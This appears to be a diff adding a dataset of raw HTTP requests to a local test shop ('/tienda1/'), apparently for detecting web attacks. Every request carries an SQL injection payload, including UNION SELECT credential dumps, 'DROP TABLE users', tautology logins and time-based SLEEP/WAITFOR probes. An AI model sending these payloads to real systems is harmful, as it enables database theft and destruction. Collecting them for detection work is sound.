+GET /tienda1/publico/articulo.jsp?search=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?usuario=1%3B%20DROP%20TABLE%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?id=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/listado.jsp?name=%27%20OR%20%27%27%3D%27 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?usuario=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+categoria=1%3B+DROP+TABLE+users+--
+
+GET /tienda1/publico/articulo.jsp?usuario=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--&offset=5 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+cmd=1+OR+1%3D1+%23&usr_login=henry&usr_passwd=letmein
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+categoria=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--
+
+GET /tienda1/publico/listado.jsp?search=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+usuario=%27+OR+%27%27%3D%27&usr_login=eve&usr_passwd=qwerty
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+
+q=%27+UNION+ALL+SELECT+NULL%2C+version%28%29+--&usr_login=carol&usr_passwd=letmein
+
+GET /tienda1/anadir.jsp?search=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--&offset=4 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?search=1%20AND%20SLEEP%285%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
